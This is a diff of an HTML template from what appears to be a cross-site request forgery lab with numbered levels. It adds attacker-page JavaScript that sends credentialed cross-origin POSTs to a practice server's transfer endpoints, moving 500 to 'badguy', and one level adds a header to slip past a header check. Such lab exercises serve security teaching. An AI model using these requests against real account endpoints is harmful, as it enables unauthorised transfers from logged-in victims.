@@ -1,11 +1,20 @@
 {{define "xhrjson"}}<!DOCTYPE html>
 <html>
 <script>
-    function post(withCredentials) {
-        var request = new XMLHttpRequest();
+    function postLevel3(withCredentials) {
+        let request = new XMLHttpRequest();
         request.withCredentials = withCredentials;
-        request.open("POST", "http://domain1.com:1323/api/transfer3");
+        request.open("POST", "https://noob-server-499444039048724483.deploys.app/api/transfer3");
         request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+        request.send(JSON.stringify({ "to": "badguy", "amount": 500 }));
+    }
+
+    function postLevel4(withCredentials) {
+        let request = new XMLHttpRequest();
+        request.withCredentials = withCredentials;
+        request.open("POST", "https://noob-server-499444039048724483.deploys.app/api/transfer4");
+        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+        request.setRequestHeader("X-Requested-With", "XMLHttpRequest");
         request.send(JSON.stringify({ "to": "badguy", "amount": 500 }));
     }
 </script>
@@ -22,9 +31,8 @@
     But the server need 'Access-Control-Allow-Credentials: true' header to allow this.
 </p>
 
-<a href="javascript:void(0);" onclick="post(false);">POST withCredentials is false</a><br>
-<a href="javascript:void(0);" onclick="post(true);">POST withCredentials is true</a><br>
-
+<a href="javascript:void(0);" onclick="postLevel3(true);">POST Level3</a><br>
+<a href="javascript:void(0);" onclick="postLevel4(true);">POST Level4</a><br>
 </body>
 </html>
 {{end}}
